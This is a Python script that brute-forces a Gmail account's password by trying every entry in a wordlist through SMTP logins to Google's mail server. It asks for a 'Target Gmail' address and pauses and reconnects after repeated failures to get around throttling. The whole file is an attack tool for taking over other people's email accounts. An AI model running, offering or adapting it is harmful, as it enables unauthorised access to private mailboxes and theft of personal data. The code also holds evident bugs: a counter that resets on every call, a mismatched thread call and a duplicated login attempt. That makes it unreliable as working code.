import smtplib
import os.path
import threading
from colorama import Fore, Style
from time import sleep


class GmailBrutForce:
    __technique = 'brute-force'

    def __init__(self, email, wordlist):
        self.email = email
        self.word = wordlist

    def server_login(self):
        """
        this method will only work if less secure app is enabled on the account.
        if less secure app is disabled, even if the password is present in wordlist it will be considered as
        wrong password.
        :return:bool
        """
        counter = 1
        server = restart_server()

        try:
            server.login(self.email, self.word)
            print(f'{Fore.GREEN}{Style.BRIGHT}[+]: Password Found: {self.word}')
            return True

        except smtplib.SMTPAuthenticationError:
            counter += 1
            print(counter)

            if counter % 20 == 0:
                server.close()
                server.quit()
                print(f'{Fore.GREEN}{Style.BRIGHT}[*]: Restarting Server. Sleeping For {sleep(20)} seconds.')
                server = restart_server()

            print(f'{Fore.RED}{Style.BRIGHT}[-]: Trying Password: {self.word}')
            return False

        except smtplib.SMTPConnectError:
            print('[-]: SMTP Connection Error Occured')

        except smtplib.SMTPRecipientsRefused:
            print('[-]: SMTP Server Refuesed Connection Error. ')

        except smtplib.SMTPNotSupportedError:
            print('[-]: SMTP Not Supported Error')

        except KeyboardInterrupt:
            print('[-]: KeyBoardInterrupt By The User')

        except TimeoutError:
            print('[-]: TimeOutError Occured')

def restart_server():
    server = smtplib.SMTP('smtp.google.com', 587)
    server.starttls()
    server.ehlo()
    return server


if __name__ == '__main__':

    user_gmail = str(input(f'{Fore.GREEN}{Style.BRIGHT}[*]: Enter Target Gmail: '))
    wordlist_path = str(input(f'{Fore.GREEN}{Style.BRIGHT}[*]: Enter Wordlist Absolute Path: '))

    if os.path.exists(wordlist_path) and os.path.isfile(wordlist_path):

        reader = ''

        if not (os.path.basename(wordlist_path) in os.listdir(os.getcwd())):
            os.chdir(os.path.dirname(wordlist_path))

        if '/' not in wordlist_path:
            reader = open(wordlist_path)
        else:
            reader = open(os.path.basename(wordlist_path))

        for line in reader.readlines():
            Threads = []
            password = line.strip()
            find_pass = GmailBrutForce(user_gmail, password)

            thread1 = threading.Thread(target=find_pass.server_login, args=(user_gmail, wordlist_path))
            thread2 = threading.Thread()

            thread1.start()
            thread2.start()

            Threads.append(thread1)
            Threads.append(thread2)

            for threads in Threads:
                threads.join()

            if find_pass.server_login():
                break

    else:
        print('******************************** -> On Line 103 ')
